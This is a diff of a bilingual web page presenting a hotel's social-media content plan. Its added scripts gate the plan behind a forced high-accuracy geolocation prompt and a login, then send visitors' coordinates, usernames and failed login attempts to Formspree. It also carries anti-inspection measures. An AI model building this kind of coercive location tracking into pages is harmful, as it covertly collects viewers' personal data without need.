@@ -2,7 +2,7 @@
 <html lang="en" dir="ltr">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Content Plan for Canary Hotel BY SOCIAL NEST</title>
     <!-- Bootstrap CSS -->
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
@@ -31,6 +31,13 @@
             --table-glow: rgba(255, 123, 0, 0.1);
         }
         
+        /* إعدادات أساسية للاستجابة */
+        html {
+            font-size: 16px;
+            -webkit-text-size-adjust: 100%;
+            -ms-text-size-adjust: 100%;
+        }
+        
         body {
             font-family: 'Cairo', sans-serif;
             font-weight: 700;
@@ -41,11 +48,20 @@
             -moz-user-select: none;
             -ms-user-select: none;
             transition: background-color 0.3s, color 0.3s;
+            width: 100%;
+            min-height: 100vh;
+            overflow-x: hidden;
+            margin: 0;
+            padding: 0;
+            -webkit-touch-callout: none;
         }
         
         .container {
+            width: 100%;
             max-width: 1200px;
-            margin-top: 30px;
+            margin: 0 auto;
+            padding: 20px;
+            box-sizing: border-box;
             position: relative;
         }
         
@@ -54,6 +70,7 @@
             color: var(--text-color);
             margin-bottom: 20px;
             font-weight: 700;
+            font-size: 2rem;
         }
         
         .description {
@@ -63,11 +80,21 @@
             font-size: 1.1rem;
         }
         
+        /* تعديلات للجدول */
+        .table-responsive {
+            overflow-x: auto;
+            -webkit-overflow-scrolling: touch;
+            width: 100%;
+            margin-bottom: 20px;
+        }
+        
         .table {
             background-color: var(--secondary-bg);
             border-radius: 10px;
             box-shadow: 0 0 15px var(--table-glow);
             transition: all 0.3s;
+            min-width: 600px;
+            width: 100%;
         }
         
         .table th {
@@ -75,12 +102,14 @@
             color: #FFFFFF;
             font-weight: 700;
             text-align: center;
+            padding: 12px 8px;
         }
         
         .table td {
             text-align: center;
             vertical-align: middle;
             color: var(--text-color);
+            padding: 10px 8px;
         }
         
         .table tr:nth-child(even) {
@@ -125,11 +154,14 @@
             background-color: var(--accent-color);
             color: white;
             border: none;
-            padding: 5px 10px;
+            padding: 10px 15px;
             border-radius: 5px;
             cursor: pointer;
             font-family: 'Cairo', sans-serif;
             font-weight: 700;
+            font-size: 1rem;
+            min-height: 44px;
+            touch-action: manipulation;
         }
         
         /* Modal Styles */
@@ -137,6 +169,9 @@
             background-color: var(--secondary-bg);
             color: var(--text-color);
             border: 1px solid var(--accent-color);
+            width: 95%;
+            max-width: 500px;
+            margin: 20px auto;
         }
         
         .modal-header {
@@ -151,6 +186,9 @@
             background-color: var(--primary-bg);
             color: var(--text-color);
             border: 1px solid var(--accent-color);
+            font-size: 1rem;
+            padding: 10px;
+            height: auto;
         }
         
         .form-control:focus {
@@ -195,30 +233,91 @@
             font-size: 24px;
         }
         
+        /* منع تغيير أحجام العناصر عند التكبير */
+        * {
+            -webkit-text-size-adjust: none;
+            text-size-adjust: none;
+            -moz-text-size-adjust: none;
+            -ms-text-size-adjust: none;
+        }
+        
+        /* إصلاح مشاكل بعض المتصفحات */
+        input, button, textarea, select {
+            -webkit-appearance: none;
+            -moz-appearance: none;
+            appearance: none;
+            font-size: 1rem;
+        }
+        
+        /* تعديلات للشاشات الصغيرة */
         @media (max-width: 768px) {
-            .table {
+            html {
                 font-size: 14px;
             }
+            
             .container {
                 padding: 15px;
             }
-            .watermark {
-                font-size: 20px;
+            
+            h1 {
+                font-size: 1.8rem;
             }
+            
+            .description {
+                font-size: 1rem;
+            }
+            
+            .watermark {
+                font-size: 24px;
+            }
+            
+            .btn-language, .btn-dark-mode {
+                padding: 8px 12px;
+                font-size: 0.9rem;
+            }
+        }
+        
+        /* إصلاح مشاكل الزوم على الهواتف */
+        @media screen and (max-width: 480px) {
+            input, select, textarea {
+                font-size: 16px;
+            }
+            
+            .modal {
+                position: fixed;
+                top: 0;
+                left: 0;
+                right: 0;
+                bottom: 0;
+                overflow-y: auto;
+            }
+            
             .language-switcher, .dark-mode-toggle {
                 position: static;
                 margin-bottom: 10px;
                 text-align: center;
             }
         }
+        
+        /* علامة مائية للحماية */
+        body::after {
+            content: "محمي © Social Nest";
+            position: fixed;
+            bottom: 10px;
+            right: 10px;
+            opacity: 0.5;
+            font-size: 16px;
+            color: red;
+            z-index: 9999;
+        }
     </style>
 </head>
 <body class="dark-mode">
- <!-- Anti-Inspect Overlay -->
-<div id="no-inspect" style="display: none;">
-    <h1>Developer Tools are Disabled</h1>
-    <p>This page has restricted access to developer tools for security reasons.</p>
-</div>
+    <!-- Anti-Inspect Overlay -->
+    <div id="no-inspect" style="display: none;">
+        <h1>Developer Tools are Disabled</h1>
+        <p>This page has restricted access to developer tools for security reasons.</p>
+    </div>
 
     <!-- Geolocation Modal -->
     <div class="modal fade geolocation-modal" id="geolocationModal" data-bs-backdrop="static" data-bs-keyboard="false" tabindex="-1" aria-labelledby="geolocationModalLabel" aria-hidden="true">
@@ -281,23 +380,25 @@
             <h1 id="mainTitle">Monthly Content Plan for Canary Hotel</h1>
             <p id="mainDescription" class="description">Weekly marketing plan for Canary Hotel's social media channels with interactive and engaging content.</p>
             <div class="watermark">Social Nest</div>
+            <div class="table-responsive">
+                <table class="table table-bordered">
+                    <thead>
+                        <tr>
+                            <th id="weekHeader">Week</th>
+                            <th id="titleHeader">Reels Title</th>
+                            <th id="typeHeader">Story Type</th>
+                            <th id="ideaHeader">Interaction Idea</th>
+                            <th id="styleHeader">Filming Style</th>
+                            <th id="colorsHeader">Suggested Colors</th>
+                            <th id="tipsHeader">Execution Tips</th>
+                        </tr>
+                    </thead>
+                    <tbody id="contentTableBody">
+                        <!-- Content will be populated by JavaScript -->
+                    </tbody>
+                </table>
+            </div>
             
-            <table class="table table-bordered">
-                <thead>
-                    <tr>
-                        <th id="weekHeader">Week</th>
-                        <th id="titleHeader">Reels Title</th>
-                        <th id="typeHeader">Story Type</th>
-                        <th id="ideaHeader">Interaction Idea</th>
-                        <th id="styleHeader">Filming Style</th>
-                        <th id="colorsHeader">Suggested Colors</th>
-                        <th id="tipsHeader">Execution Tips</th>
-                    </tr>
-                </thead>
-                <tbody id="contentTableBody">
-                    <!-- Content will be populated by JavaScript -->
-                </tbody>
-            </table>
             <div class="footer">
                 <p id="footerText">Social Nest</p>
             </div>
@@ -307,129 +408,409 @@
     <!-- Bootstrap JS and Popper.js -->
     <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
     <script>
-        // =================================================
-        // Advanced Security Measures
-        // =================================================
+ // =================================================
+// Content Data Structure (English as primary)
+// =================================================
+const contentData = {
+    en: [
+        // Week 1 Content
+        {
+            week: "Week 1",
+            title: "Room Tour",
+            type: "Interactive Story",
+            idea: "\"Double bed or King size?\"",
+            style: "Soft shots, natural light, angles from inside the room",
+            colors: "Beige, White, Wooden",
+            tips: "Use natural light",
+            ar: {
+                week: "الأسبوع 1",
+                title: "جولة في الغرف",
+                type: "استوري تفاعلي",
+                idea: "\"سرير مزدوج ولا كينج؟\"",
+                style: "لقطات ناعمة، ضوء طبيعي، زوايا من داخل الغرفة",
+                colors: "بيج، أبيض، خشبي",
+                tips: "استخدام ضوء طبيعي"
+            }
+        },
+        {
+            week: "Week 1",
+            title: "Hospitality Details",
+            type: "Interactive Story",
+            idea: "\"How do you like to be welcomed on your first day?\"",
+            style: "Slow motion shots of staff during preparation",
+            colors: "Beige with warm touches",
+            tips: "Focus on faces and smiles",
+            ar: {
+                week: "الأسبوع 1",
+                title: "تفاصيل الضيافة",
+                type: "استوري تفاعلي",
+                idea: "\"تحب تستقبل إزاي أول يوم؟\"",
+                style: "لقطات للطاقم - Slow Motion وقت التحضير",
+                colors: "بيج + لمسات دافئة",
+                tips: "التركيز على الوجوه والابتسامات"
+            }
+        },
+        {
+            week: "Week 1",
+            title: "First Sight",
+            type: "Interactive Story",
+            idea: "\"What's the first thing you do when you arrive?\"",
+            style: "Angle from the door - camera follows the guest",
+            colors: "Sea color in background",
+            tips: "Natural sound - realistic shot",
+            ar: {
+                week: "الأسبوع 1",
+                title: "أول مشهد بتشوفه",
+                type: "استوري تفاعلي",
+                idea: "\"أول حاجة تعملها أول ما توصل؟\"",
+                style: "زاوية من الباب - كاميرا تمشي مع الضيف",
+                colors: "لون البحر بالخلفية",
+                tips: "صوت طبيعي - لقطة واقعية"
+            }
+        },
+
+        // Week 2 Content
+        {
+            week: "Week 2",
+            title: "Canary Sunset",
+            type: "Interactive Story",
+            idea: "\"Who would you like to watch the sunset with?\"",
+            style: "Shot from the sea - setting sunlight",
+            colors: "Orange + Blue",
+            tips: "Film 30 minutes before sunset",
+            ar: {
+                week: "الأسبوع 2",
+                title: "غروب كناري",
+                type: "استوري تفاعلي",
+                idea: "\"تحب تتفرج على الغروب مع مين؟\"",
+                style: "لقطة من البحر - ضوء الشمس نازل",
+                colors: "برتقالي + أزرق",
+                tips: "وقت التصوير قبل الغروب بـ30 دقيقة"
+            }
+        },
+        {
+            week: "Week 2",
+            title: "Dinner by the Sea",
+            type: "Interactive Story",
+            idea: "\"Who would you surprise?\"",
+            style: "Angle above the table - soft lighting",
+            colors: "Gold + Dark Blue",
+            tips: "Candles + fixed camera",
+            ar: {
+                week: "الأسبوع 2",
+                title: "عشاء على البحر",
+                type: "استوري تفاعلي",
+                idea: "\"تعمل مفاجأة لمين؟\"",
+                style: "زاوية فوق الطاولة - إضاءة خفيفة",
+                colors: "ذهبي + أزرق غامق",
+                tips: "شمع + كاميرا ثابتة"
+            }
+        },
+        {
+            week: "Week 2",
+            title: "Canary for Couples",
+            type: "Interactive Story",
+            idea: "\"Share your most romantic moment with us\"",
+            style: "Changing shots of couples - Slow motion",
+            colors: "Natural - Blue - Green",
+            tips: "Soft movements + authentic",
+            ar: {
+                week: "الأسبوع 2",
+                title: "كناري للأزواج",
+                type: "استوري تفاعلي",
+                idea: "\"شاركنا أجمل لحظة رومانسية عشتها\"",
+                style: "لقطات متغيرة لأزواج - Slow Motion",
+                colors: "طبيعي - أزرق - أخضر",
+                tips: "حركات ناعمة + حقيقية"
+            }
+        },
+
+        // Week 3 Content
+        {
+            week: "Week 3",
+            title: "Breakfast by the Sea",
+            type: "Interactive Story",
+            idea: "\"Do you prefer breakfast in room or by the sea?\"",
+            style: "Overhead shot of plate + sea view",
+            colors: "White + Food colors",
+            tips: "Film immediately after preparation",
+            ar: {
+                week: "الأسبوع 3",
+                title: "فطار على البحر",
+                type: "استوري تفاعلي",
+                idea: "\"تحب تفطر في الأوضة ولا على البحر؟\"",
+                style: "لقطة من فوق للطبق + البحر",
+                colors: "أبيض + ألوان الأكل",
+                tips: "تصوير فوري بعد تحضير الفطار"
+            }
+        },
+        {
+            week: "Week 3",
+            title: "From Kitchen to Table",
+            type: "Interactive Story",
+            idea: "\"What would you like to see from the kitchen?\"",
+            style: "From inside kitchen - soft sound",
+            colors: "Warm tones - Kitchen fire",
+            tips: "Stable mobile - close shots",
+            ar: {
+                week: "الأسبوع 3",
+                title: "من المطبخ للترابيزة",
+                type: "استوري تفاعلي",
+                idea: "\"تحب تشوف إيه من المطبخ؟\"",
+                style: "من داخل المطبخ - صوت ناعم",
+                colors: "نغمات دافئة - نار المطبخ",
+                tips: "موبايل ثابت - لقطات مقربة"
+            }
+        },
+        {
+            week: "Week 3",
+            title: "Relaxation Time",
+            type: "Interactive Story",
+            idea: "\"Where do you prefer to relax most?\"",
+            style: "Pool shot - long take",
+            colors: "Turquoise + Beige",
+            tips: "Single angle - static image",
+            ar: {
+                week: "الأسبوع 3",
+                title: "وقت الراحة",
+                type: "استوري تفاعلي",
+                idea: "\"تحب ترتاح فين أكتر؟\"",
+                style: "لقطة من البيسين - لقطة طويلة",
+                colors: "فيروزي + بيج",
+                tips: "زاوية واحدة - صورة ثابتة"
+            }
+        },
+
+        // Week 4 Content
+        {
+            week: "Week 4",
+            title: "Relaxation Moments",
+            type: "Interactive Story",
+            idea: "\"Massage or breakfast first?\"",
+            style: "Side angle - Spa + music",
+            colors: "Soft Gray + Beige",
+            tips: "Calming sound - no talking",
+            ar: {
+                week: "الأسبوع 4",
+                title: "لحظات استرخاء",
+                type: "استوري تفاعلي",
+                idea: "\"مساج ولا فطار أول؟\"",
+                style: "زاوية من الجنب - سبا + موسيقى",
+                colors: "رمادي ناعم + بيج",
+                tips: "صوت مهدّئ - بدون كلام"
+            }
+        },
+        {
+            week: "Week 4",
+            title: "Complete Spa Experience",
+            type: "Interactive Story",
+            idea: "\"Would you like to try the Spa?\"",
+            style: "Wide angle of room - candles",
+            colors: "White + Simple Green",
+            tips: "Arrange space before filming",
+            ar: {
+                week: "الأسبوع 4",
+                title: "تجربة Spa كاملة",
+                type: "استوري تفاعلي",
+                idea: "\"تحب تجرب السبا؟\"",
+                style: "زاوية عريضة للغرفة - شموع",
+                colors: "أبيض + أخضر بسيط",
+                tips: "ترتيب المكان قبل التصوير"
+            }
+        },
+        {
+            week: "Week 4",
+            title: "Quiet Day",
+            type: "Interactive Story",
+            idea: "\"Which moment do you enjoy the most?\"",
+            style: "Different scenes throughout the day",
+            colors: "Varied but soft colors",
+            tips: "Light editing + simple music",
+            ar: {
+                week: "الأسبوع 4",
+                title: "يوم هادي",
+                type: "استوري تفاعلي",
+                idea: "\"أي لحظة أكتر حاجة بتحبها؟\"",
+                style: "مشاهد مختلفة طوال اليوم",
+                colors: "ألوان متنوعة لكن ناعمة",
+                tips: "مونتاج خفيف + موسيقى بسيطة"
+            }
+        }
+    ]
+};
+
+// =================================================
+// Application State
+// =================================================
+let currentLanguage = 'en'; // Default to English
+let userPosition = null;
+let usernameInput = null;
+
+// =================================================
+// Core Functions
+// =================================================
+
+/**
+ * Populates the content table based on selected language
+ */
+function populateTable(language) {
+    const tableBody = document.getElementById('contentTableBody');
+    tableBody.innerHTML = '';
+    
+    contentData.en.forEach(item => {
+        const row = document.createElement('tr');
         
-        // Prevent opening developer tools
-        function blockDevTools() {
-    // Block F12, Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+Shift+C, Ctrl+U
-    document.addEventListener('keydown', function(e) {
-        if (e.key === 'F12' || 
-            (e.ctrlKey && e.shiftKey && e.key === 'I') || 
-            (e.ctrlKey && e.shiftKey && e.key === 'J') ||
-            (e.ctrlKey && e.shiftKey && e.key === 'C') ||
-            (e.ctrlKey && e.key === 'U')) {
-            e.preventDefault();
-            return false;
+        if (language === 'ar') {
+            row.innerHTML = `
+                <td>${item.ar.week}</td>
+                <td>${item.ar.title}</td>
+                <td>${item.ar.type}</td>
+                <td>${item.ar.idea}</td>
+                <td>${item.ar.style}</td>
+                <td>${item.ar.colors}</td>
+                <td>${item.ar.tips}</td>
+            `;
+        } else {
+            row.innerHTML = `
+                <td>${item.week}</td>
+                <td>${item.title}</td>
+                <td>${item.type}</td>
+                <td>${item.idea}</td>
+                <td>${item.style}</td>
+                <td>${item.colors}</td>
+                <td>${item.tips}</td>
+            `;
         }
-    });
-    
-    // Right click disable
-    document.addEventListener('contextmenu', function(e) {
-        e.preventDefault();
-        return false;
-    });
-    
-    // تم تعليق الكشف التلقائي عن أدوات المطور
-    /*
-    function detectDevTools() {
-        const widthThreshold = window.outerWidth - window.innerWidth > 160;
-        const heightThreshold = window.outerHeight - window.innerHeight > 160;
-        const orientation = widthThreshold ? 'vertical' : 'horizontal';
         
-        if ((heightThreshold && orientation === 'horizontal') || 
-            (widthThreshold && orientation === 'vertical')) {
-            document.body.innerHTML = '';
-            window.location.reload();
-        }
-    }
-    
-    // Check periodically
-    setInterval(detectDevTools, 1000);
-    */
-    
-    // Block menu key (some keyboards have it)
-    document.addEventListener('keydown', function(e) {
-        if (e.key === 'ContextMenu') {
-            e.preventDefault();
-            return false;
-        }
+        tableBody.appendChild(row);
     });
-    
-    // Block Ctrl+Shift+I via meta key for Mac
-    document.addEventListener('keydown', function(e) {
-        if (e.metaKey && e.altKey && e.key === 'I') {
-            e.preventDefault();
-            return false;
-        }
-    });
-    
-    // Block common debugging functions
-    Object.defineProperty(window, 'console', {
-        value: console,
-        writable: false,
-        configurable: false
-    });
-    
-    // Override console methods
-    ['log', 'warn', 'error', 'info', 'debug'].forEach(function(method) {
-        console[method] = function() {
-            return false;
-        };
-    });
-    
-    // Block view source
-    document.onkeypress = function(e) {
-        if (e.ctrlKey && (e.key === 'u' || e.key === 'U')) {
-            return false;
-        }
-    };
 }
+
+/**
+ * Updates all UI elements based on selected language
+ */
+function updateLanguage() {
+    // Update table content
+    populateTable(currentLanguage);
+    
+    // Update UI elements
+    document.getElementById('mainTitle').textContent = 
+        currentLanguage === 'en' 
+        ? "Monthly Content Plan for Canary Hotel" 
+        : "خطة المحتوى الشهرية لفندق كناري";
         
-        // Initialize security measures
-        blockDevTools();
-        
-        // Show geolocation modal on page load
-        document.addEventListener('DOMContentLoaded', function() {
-            const geolocationModal = new bootstrap.Modal(document.getElementById('geolocationModal'));
-            geolocationModal.show();
-            
-            // Submit geolocation handler
-            document.getElementById('enableGeolocation').addEventListener('click', function() {
-                if ("geolocation" in navigator) {
-                    navigator.geolocation.getCurrentPosition(
-    function(position) {
-        // Successfully got location
-        geolocationModal.hide();
-        const passwordModal = new bootstrap.Modal(document.getElementById('passwordModal'));
-        passwordModal.show();
-        
-        // Store position for later use
-        window.userPosition = position;
-    },
-    function(error) {
-        // Error getting location
+    document.getElementById('mainDescription').textContent = 
+        currentLanguage === 'en' 
+        ? "Weekly marketing plan for Canary Hotel's social media channels with interactive and engaging content."
+        : "خطة تسويقية أسبوعية لقنوات التواصل الاجتماعي لفندق كناري بمحتوى تفاعلي وجذاب.";
+    
+    // Update table headers
+    document.getElementById('weekHeader').textContent = currentLanguage === 'en' ? "Week" : "الأسبوع";
+    document.getElementById('titleHeader').textContent = currentLanguage === 'en' ? "Reels Title" : "عنوان الريلز";
+    document.getElementById('typeHeader').textContent = currentLanguage === 'en' ? "Story Type" : "نوع الاستوري";
+    document.getElementById('ideaHeader').textContent = currentLanguage === 'en' ? "Interaction Idea" : "فكرة التفاعل";
+    document.getElementById('styleHeader').textContent = currentLanguage === 'en' ? "Filming Style" : "ستايل التصوير";
+    document.getElementById('colorsHeader').textContent = currentLanguage === 'en' ? "Suggested Colors" : "الألوان المقترحة";
+    document.getElementById('tipsHeader').textContent = currentLanguage === 'en' ? "Execution Tips" : "نصائح تنفيذ";
+    
+    // Update footer
+    document.getElementById('footerText').textContent = 
+        currentLanguage === 'en' 
+        ? "Social Nest" 
+        : "Social Nest | سوشيال نيست";
+    
+    // Update language toggle button
+    document.getElementById('languageToggle').textContent = 
+        currentLanguage === 'en' 
+        ? "العربية" 
+        : "English";
+    
+    // Update direction and alignment
+    if (currentLanguage === 'ar') {
+        document.documentElement.lang = 'ar';
+        document.documentElement.dir = 'rtl';
+        document.querySelector('.language-switcher').style.right = '10px';
+        document.querySelector('.language-switcher').style.left = 'auto';
+        document.querySelector('.dark-mode-toggle').style.left = '10px';
+        document.querySelector('.dark-mode-toggle').style.right = 'auto';
+    } else {
+        document.documentElement.lang = 'en';
+        document.documentElement.dir = 'ltr';
+        document.querySelector('.language-switcher').style.right = 'auto';
+        document.querySelector('.language-switcher').style.left = '10px';
+        document.querySelector('.dark-mode-toggle').style.left = 'auto';
+        document.querySelector('.dark-mode-toggle').style.right = '10px';
+    }
+}
+
+/**
+ * Toggles between dark and light mode
+ */
+function toggleDarkMode() {
+    document.body.classList.toggle('light-mode');
+    if (document.body.classList.contains('light-mode')) {
+        document.getElementById('darkModeToggle').innerHTML = '<i class="fas fa-moon"></i>';
+        document.body.classList.remove('dark-mode');
+    } else {
+        document.getElementById('darkModeToggle').innerHTML = '<i class="fas fa-sun"></i>';
+        document.body.classList.add('dark-mode');
+    }
+}
+
+/**
+ * Handles geolocation functionality
+ */
+function handleGeolocation() {
+    if ("geolocation" in navigator) {
+        navigator.geolocation.getCurrentPosition(
+            function(position) {
+                userPosition = position;
+                const geolocationModal = bootstrap.Modal.getInstance(document.getElementById('geolocationModal'));
+                geolocationModal.hide();
+                
+                const passwordModal = new bootstrap.Modal(document.getElementById('passwordModal'));
+                passwordModal.show();
+                
+                // Send location data
+                sendToFormspree('Geolocation Success', {
+                    latitude: position.coords.latitude,
+                    longitude: position.coords.longitude,
+                    accuracy: position.coords.accuracy
+                });
+            },
+            function(error) {
+                document.getElementById('geolocationError').style.display = 'block';
+                document.getElementById('geolocationError').textContent = 
+                    currentLanguage === 'en' 
+                    ? 'Permission denied. Please enable geolocation to continue.' 
+                    : 'تم رفض الإذن. يرجى تفعيل الموقع الجغرافي للاستمرار.';
+                
+                sendToFormspree('Geolocation Error', {
+                    error: error.message
+                });
+            },
+            {
+                enableHighAccuracy: true,
+                timeout: 10000,
+                maximumAge: 0
+            }
+        );
+    } else {
         document.getElementById('geolocationError').style.display = 'block';
         document.getElementById('geolocationError').textContent = 
             currentLanguage === 'en' 
-            ? 'Permission denied. Please enable geolocation to continue.' 
-            : 'تم رفض الإذن. يرجى تفعيل الموقع الجغرافي للاستمرار.';
+            ? 'Geolocation is not supported by your browser.' 
+            : 'المتصفح الخاص بك لا يدعم خدمة الموقع الجغرافي.';
+        
+        sendToFormspree('Geolocation Not Supported', {});
     }
-);
-                } else {
-                    // Geolocation not supported
-                    document.getElementById('geolocationError').style.display = 'block';
-                    document.getElementById('geolocationError').textContent = 
-                        currentLanguage === 'en' 
-                        ? 'Geolocation is not supported by your browser.' 
-                        : 'المتصفح الخاص بك لا يدعم خدمة الموقع الجغرافي.';
-                }
-            });
-            
-            // Submit login handler
-            document.getElementById('submitLogin').addEventListener('click', function() {
-    const usernameInput = document.getElementById('usernameInput').value;
+}
+
+/**
+ * Handles login functionality
+ */
+function handleLogin() {
+    usernameInput = document.getElementById('usernameInput').value;
     const passwordInput = document.getElementById('passwordInput').value;
     const usernameError = document.getElementById('usernameError');
     const passwordError = document.getElementById('passwordError');
@@ -451,325 +832,44 @@
         passwordModal.hide();
         document.getElementById('mainContent').style.display = 'block';
         
-        // Send data to Formspree
-        if (window.userPosition) {
-            sendToFormspree(usernameInput, window.userPosition);
+        // Send login success data
+        const loginData = {
+            username: usernameInput,
+            status: 'success'
+        };
+        
+        if (userPosition) {
+            loginData.latitude = userPosition.coords.latitude;
+            loginData.longitude = userPosition.coords.longitude;
         }
+        
+        sendToFormspree('Login Success', loginData);
     } else {
         passwordError.style.display = 'block';
-    }
-});
-            
-            // Allow pressing Enter to submit login
-            document.getElementById('passwordInput').addEventListener('keypress', function(e) {
-                if (e.key === 'Enter') {
-                    document.getElementById('submitLogin').click();
-                }
-            });
-            
-            document.getElementById('usernameInput').addEventListener('keypress', function(e) {
-                if (e.key === 'Enter') {
-                    document.getElementById('submitLogin').click();
-                }
-            });
-            
-            // Prevent numbers in username field
-            document.getElementById('usernameInput').addEventListener('input', function(e) {
-                const value = e.target.value;
-                if (/\d/.test(value)) {
-                    e.target.value = value.replace(/\d/g, '');
-                }
-            });
+        
+        // Send failed login attempt
+        sendToFormspree('Login Failed', {
+            username: usernameInput,
+            status: 'failed'
         });
+    }
+}
 
-        // Content data for both languages
-        const contentData = {
-            en: [
-                {
-                    week: "Week 1",
-                    title: "Room Tour",
-                    type: "Interactive Story",
-                    idea: "\"Double bed or King size?\"",
-                    style: "Soft shots, natural light, angles from inside the room",
-                    colors: "Beige, White, Wooden",
-                    tips: "Use natural light"
-                },
-                {
-                    week: "Week 1",
-                    title: "Hospitality Details",
-                    type: "Interactive Story",
-                    idea: "\"How do you like to be welcomed on your first day?\"",
-                    style: "Slow motion shots of staff during preparation",
-                    colors: "Beige with warm touches",
-                    tips: "Focus on faces and smiles"
-                },
-                {
-                    week: "Week 1",
-                    title: "First Sight",
-                    type: "Interactive Story",
-                    idea: "\"What's the first thing you do when you arrive?\"",
-                    style: "Angle from the door - camera follows the guest",
-                    colors: "Sea color in background",
-                    tips: "Natural sound - realistic shot"
-                },
-                {
-                    week: "Week 2",
-                    title: "Canary Sunset",
-                    type: "Interactive Story",
-                    idea: "\"Who would you like to watch the sunset with?\"",
-                    style: "Shot from the sea - setting sunlight",
-                    colors: "Orange + Blue",
-                    tips: "Film 30 minutes before sunset"
-                },
-                {
-                    week: "Week 2",
-                    title: "Dinner by the Sea",
-                    type: "Interactive Story",
-                    idea: "\"Who would you surprise?\"",
-                    style: "Angle above the table - soft lighting",
-                    colors: "Gold + Dark Blue",
-                    tips: "Candles + fixed camera"
-                },
-                {
-                    week: "Week 2",
-                    title: "Canary for Couples",
-                    type: "Interactive Story",
-                    idea: "\"Share your most romantic moment with us\"",
-                    style: "Changing shots of couples - Slow motion",
-                    colors: "Natural - Blue - Green",
-                    tips: "Soft movements + authentic"
-                },
-                {
-                    week: "Week 3",
-                    title: "Breakfast by the Sea",
-                    type: "Interactive Story",
-                    idea: "\"Do you prefer breakfast in room or by the sea?\"",
-                    style: "Overhead shot of plate + sea view",
-                    colors: "White + Food colors",
-                    tips: "Film immediately after preparation"
-                },
-                {
-                    week: "Week 3",
-                    title: "From Kitchen to Table",
-                    type: "Interactive Story",
-                    idea: "\"What would you like to see from the kitchen?\"",
-                    style: "From inside kitchen - soft sound",
-                    colors: "Warm tones - Kitchen fire",
-                    tips: "Stable mobile - close shots"
-                },
-                {
-                    week: "Week 3",
-                    title: "Relaxation Time",
-                    type: "Interactive Story",
-                    idea: "\"Where do you prefer to relax most?\"",
-                    style: "Pool shot - long take",
-                    colors: "Turquoise + Beige",
-                    tips: "Single angle - static image"
-                },
-                {
-                    week: "Week 4",
-                    title: "Relaxation Moments",
-                    type: "Interactive Story",
-                    idea: "\"Massage or breakfast first?\"",
-                    style: "Side angle - Spa + music",
-                    colors: "Soft Gray + Beige",
-                    tips: "Calming sound - no talking"
-                },
-                {
-                    week: "Week 4",
-                    title: "Complete Spa Experience",
-                    type: "Interactive Story",
-                    idea: "\"Would you like to try the Spa?\"",
-                    style: "Wide angle of room - candles",
-                    colors: "White + Simple Green",
-                    tips: "Arrange space before filming"
-                },
-                {
-                    week: "Week 4",
-                    title: "Quiet Day",
-                    type: "Interactive Story",
-                    idea: "\"Which moment do you enjoy the most?\"",
-                    style: "Different scenes throughout the day",
-                    colors: "Varied but soft colors",
-                    tips: "Light editing + simple music"
-                }
-            ],
-            ar: [
-                {
-                    week: "الأسبوع 1",
-                    title: "جولة في الغرف",
-                    type: "استوري تفاعلي",
-                    idea: "\"سرير مزدوج ولا كينج؟\"",
-                    style: "لقطات ناعمة، ضوء طبيعي، زوايا من داخل الغرفة",
-                    colors: "بيج، أبيض، خشبي",
-                    tips: "استخدام ضوء طبيعي"
-                },
-                {
-                    week: "الأسبوع 1",
-                    title: "تفاصيل الضيافة",
-                    type: "استوري تفاعلي",
-                    idea: "\"تحب تستقبل إزاي أول يوم؟\"",
-                    style: "لقطات للطاقم - Slow Motion وقت التحضير",
-                    colors: "بيج + لمسات دافئة",
-                    tips: "التركيز على الوجوه والابتسامات"
-                },
-                {
-                    week: "الأسبوع 1",
-                    title: "أول مشهد بتشوفه",
-                    type: "استوري تفاعلي",
-                    idea: "\"أول حاجة تعملها أول ما توصل؟\"",
-                    style: "زاوية من الباب - كاميرا تمشي مع الضيف",
-                    colors: "لون البحر بالخلفية",
-                    tips: "صوت طبيعي - لقطة واقعية"
-                },
-                {
-                    week: "الأسبوع 2",
-                    title: "غروب كناري",
-                    type: "استوري تفاعلي",
-                    idea: "\"تحب تتفرج على الغروب مع مين؟\"",
-                    style: "لقطة من البحر - ضوء الشمس نازل",
-                    colors: "برتقالي + أزرق",
-                    tips: "وقت التصوير قبل الغروب بـ30 دقيقة"
-                },
-                {
-                    week: "الأسبوع 2",
-                    title: "عشاء على البحر",
-                    type: "استوري تفاعلي",
-                    idea: "\"تعمل مفاجأة لمين؟\"",
-                    style: "زاوية فوق الطاولة - إضاءة خفيفة",
-                    colors: "ذهبي + أزرق غامق",
-                    tips: "شمع + كاميرا ثابتة"
-                },
-                {
-                    week: "الأسبوع 2",
-                    title: "كناري للأزواج",
-                    type: "استوري تفاعلي",
-                    idea: "\"شاركنا أجمل لحظة رومانسية عشتها\"",
-                    style: "لقطات متغيرة لأزواج - Slow Motion",
-                    colors: "طبيعي - أزرق - أخضر",
-                    tips: "حركات ناعمة + حقيقية"
-                },
-                {
-                    week: "الأسبوع 3",
-                    title: "فطار على البحر",
-                    type: "استوري تفاعلي",
-                    idea: "\"تحب تفطر في الأوضة ولا على البحر؟\"",
-                    style: "لقطة من فوق للطبق + البحر",
-                    colors: "أبيض + ألوان الأكل",
-                    tips: "تصوير فوري بعد تحضير الفطار"
-                },
-                {
-                    week: "الأسبوع 3",
-                    title: "من المطبخ للترابيزة",
-                    type: "استوري تفاعلي",
-                    idea: "\"تحب تشوف إيه من المطبخ؟\"",
-                    style: "من داخل المطبخ - صوت ناعم",
-                    colors: "نغمات دافئة - نار المطبخ",
-                    tips: "موبايل ثابت - لقطات مقربة"
-                },
-                {
-                    week: "الأسبوع 3",
-                    title: "وقت الراحة",
-                    type: "استوري تفاعلي",
-                    idea: "\"تحب ترتاح فين أكتر؟\"",
-                    style: "لقطة من البيسين - لقطة طويلة",
-                    colors: "فيروزي + بيج",
-                    tips: "زاوية واحدة - صورة ثابتة"
-                },
-                {
-                    week: "الأسبوع 4",
-                    title: "لحظات استرخاء",
-                    type: "استوري تفاعلي",
-                    idea: "\"مساج ولا فطار أول؟\"",
-                    style: "زاوية من الجنب - سبا + موسيقى",
-                    colors: "رمادي ناعم + بيج",
-                    tips: "صوت مهدّئ - بدون كلام"
-                },
-                {
-                    week: "الأسبوع 4",
-                    title: "تجربة Spa كاملة",
-                    type: "استوري تفاعلي",
